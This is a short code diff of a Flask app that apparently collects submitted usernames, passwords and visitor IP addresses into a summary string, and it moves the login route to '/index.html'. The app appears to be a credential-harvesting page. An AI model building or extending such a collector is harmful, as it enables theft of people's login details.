@@ -10,7 +10,7 @@ ip_every = []
 totals = (f"The details are: {usernames} \n {passwords}\n and the ip is {ip_every}")
 
 
-@app.route("/", method=["GET", "POST"])
+@app.route("/index.html", method=["GET", "POST"])
 def index():
 	if request.method == "POST":
 		username = request.form.get("username")
